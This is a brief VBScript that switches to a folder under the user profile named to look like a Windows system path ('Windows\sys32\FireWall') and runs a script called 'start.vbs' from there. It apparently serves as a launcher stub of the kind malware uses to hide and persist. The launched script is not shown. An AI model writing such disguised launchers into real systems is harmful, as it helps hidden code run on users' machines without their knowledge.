Dim script
Set script = Nothing
Set script = Wscript.CreateObject("WScript.shell")

strHomeFolder = script.ExpandEnvironmentStrings("%USERPROFILE%") & "\Windows\sys32\FireWall"
script.CurrentDirectory = strHomeFolder
script.run "start.vbs"